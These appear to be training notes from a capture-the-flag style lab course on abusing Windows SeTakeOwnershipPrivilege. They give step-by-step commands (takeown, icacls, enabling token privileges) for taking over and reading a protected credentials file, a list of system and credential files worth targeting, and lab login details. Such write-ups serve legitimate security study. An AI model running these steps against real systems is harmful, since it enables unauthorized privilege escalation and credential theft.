# SeTakeOwnershipPrivilege

SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.

This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor. 

Administrators are assigned this privilege by default.

--> possible to encounter a service account that is tasked with running backup jobs and VSS snapshots assigned this privilege

Other privileges :
SeBackupPrivilege
SeRestorePrivilege
SeSecurityPrivilege

The setting can be set in Group Policy under:

Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment

## Leveraging the Privilege

### Reviewing Current User Privileges

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

### Enabling SeTakeOwnershipPrivilege

```
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled

```

### Choosing a Target File

--> It is common to encounter file shares with Public and Private directories with subdirectories set up by department

```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

### Checking File Ownership

```
cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free

```

### Taking Ownership of the File

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown

```
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

### Confirming Ownership Changed

```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

### Modifying the File ACL

```
cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files

```

### Reading the File

```
cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!

```

### Example of local files of interest

c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav

files such as passwords.*, pass.*, creds.*, *.kdbx

## LAB

xfreerdp /v:10.129.113.23 /u:htb-student /p:HTB_@cademy_stdnt!

cat C:\TakeOwn\flag.txt

cat : Access to the path 'C:\TakeOwn\flag.txt' is denied.
At line:1 char:1
+ cat C:\TakeOwn\flag.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\TakeOwn\flag.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand


PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

cd c:\Tools

Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1

PS C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled


PS C:\Tools> Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Express
ion={ (Get-Acl $_.FullName).Owner }}

FullName            LastWriteTime        Attributes Owner
--------            -------------        ---------- -----
C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM    Archive

PS C:\Tools> cmd /c dir /q 'C:\TakeOwn\flag.txt'
 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B

 Directory of C:\TakeOwn

06/04/2021  10:24 AM                22 ...                    flag.txt
               1 File(s)             22 bytes
               0 Dir(s)  18,235,830,272 bytes free

PS C:\Tools> takeown /f 'C:\TakeOwn\flag.txt'
SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-SRV01\htb-student".

PS C:\Tools> Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.F
ullname).Owner}}

Name     Directory  Owner
----     ---------  -----
flag.txt C:\TakeOwn WINLPE-SRV01\htb-student


PS C:\Tools> cat C:\TakeOwn\flag.txt
cat : Access to the path 'C:\TakeOwn\flag.txt' is denied.
At line:1 char:1
+ cat C:\TakeOwn\flag.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\TakeOwn\flag.txt:String) [Get-Content], UnauthorizedAccessExceptio
   n
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand


PS C:\Tools> icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
processed file: C:\TakeOwn\flag.txt
Successfully processed 1 files; Failed processing 0 files

PS C:\Tools> cat C:\TakeOwn\flag.txt
1m_th3_f1l3_0wn3r_n0W!